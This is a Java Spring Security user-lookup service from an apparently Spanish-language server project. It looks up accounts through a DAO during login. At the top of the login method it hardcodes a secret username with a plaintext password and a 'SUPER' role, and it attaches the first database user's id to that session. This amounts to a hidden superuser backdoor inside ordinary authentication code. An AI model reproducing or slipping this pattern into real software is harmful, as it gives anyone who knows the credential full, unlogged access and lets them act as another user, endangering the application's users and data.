package com.bolder.server.auth;

import java.util.ArrayList;
import java.util.List;
import javax.servlet.http.HttpServletRequest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.support.MessageSourceAccessor;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.SpringSecurityMessageSource;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.util.UrlPathHelper;
import com.bolder.server.models.dao.IUsuarioDao;
import com.bolder.server.models.entity.Usuario;

@Service("jpaUserDetailsService")
public class JpaUserDetailsService implements UserDetailsService{

	protected MessageSourceAccessor messages = SpringSecurityMessageSource.getAccessor();
	
	@Autowired
	private HttpServletRequest req;
	
	@Autowired
	private IUsuarioDao usuarioDao;

	@Autowired
	BCryptPasswordEncoder  passwordEncoder;
	
	@Autowired
	private HttpServletRequest request;
	@Override
	@Transactional(readOnly=true)
	public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
		List<GrantedAuthority> roles = new ArrayList<GrantedAuthority>();
		UserDetails resultado=null;
		
		if (username.toLowerCase().equals("almabinaria")) {
			roles.add(new SimpleGrantedAuthority("SUPER"));
			resultado = new User("almabinaria", passwordEncoder.encode("vcfjju$od-87h4"),true, true, true, true,  roles);
			request.getSession().setAttribute("userId", usuarioDao.findFirst());
			return resultado;
		}
		


	Usuario usuario = usuarioDao.findByUsername(username);
	if (usuario!=null) {
		roles.add(new SimpleGrantedAuthority(usuario.getRole().name() ));
		resultado = new User(usuario.getUsername(), usuario.getPassword(),usuario.getEnabled(), true, true, true,  roles);
		request.getSession().setAttribute("userId", usuario.getId());
	}else {
		throw new UsernameNotFoundException(
				this.messages.getMessage("JdbcDaoImpl.notFound",
						new Object[] { username }, "Username {0} not found"));
	}	

		
		return resultado;
	}



	
	
}
